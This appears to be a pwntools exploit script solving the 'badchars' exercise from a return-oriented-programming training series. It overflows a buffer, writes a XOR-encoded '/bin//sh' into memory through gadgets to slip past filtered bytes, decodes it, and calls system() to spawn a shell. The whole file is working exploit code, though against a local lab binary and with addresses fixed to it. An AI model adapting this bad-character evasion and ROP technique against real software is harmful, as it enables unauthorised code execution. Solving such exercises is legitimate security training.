#!/usr/bin/python
from pwn import *

def xor(string):
	str = bytearray(string)
	result = ''
	for i in range(len(str)):
	     result += chr(str[i] ^ 0x9)
	return result

garbage = "A"*40

system = p64(0x00000000004006f0)
data = 0x0000000000601074

binsh = "/bin//sh"

#xor BYTE PTR [r15],r14b
xor_r15_r14 = p64(0x0000000000400b30)

#mov QWORD PTR [r13+0x0],r12
mov_r13_r12 = p64(0x0000000000400b34)

#pop rdi
pop_rdi = p64(0x0000000000400b39)

#pop r12; pop r13
pop_r12_pop_r13 = p64(0x0000000000400b3b)

#pop r14; pop r15
pop_r14_pop_r15 = p64(0x0000000000400b40)


exploit  = garbage
exploit += pop_r12_pop_r13
exploit += xor(binsh)
exploit += p64(data)
exploit += mov_r13_r12
exploit += pop_r12_pop_r13
exploit += p64(0)
exploit += p64(data+8)
exploit += mov_r13_r12
for i in range(len(binsh)):
	exploit += pop_r14_pop_r15
	exploit += p64(9)
	exploit += p64(data+i)
	exploit += xor_r15_r14
exploit += pop_rdi
exploit += p64(data)
exploit += system

p = process("./badchars")
p.sendlineafter("> ",exploit)
p.interactive()
